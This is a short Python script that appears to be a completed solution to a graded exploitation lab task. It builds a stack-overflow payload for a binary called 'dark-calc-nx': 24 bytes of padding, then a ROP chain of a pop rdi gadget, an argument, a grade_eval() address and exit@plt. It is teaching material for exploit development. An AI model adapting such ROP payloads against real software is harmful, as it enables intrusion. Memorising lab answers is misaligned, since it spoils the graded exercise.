#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

p64 = lambda x: struct.pack("<Q", x)

# Offset to saved RIP
padding = b"A" * 24

# pop rdi; ret
pop_rdi_ret = 0x401a33

# grade_eval()
grade_eval = 0x401978

# exit@plt
exit_plt = 0x4016e0

payload = (
    padding
    + p64(pop_rdi_ret)
    + p64(4)
    + p64(grade_eval)
    + p64(exit_plt)
)

sys.stdout.buffer.write(payload)

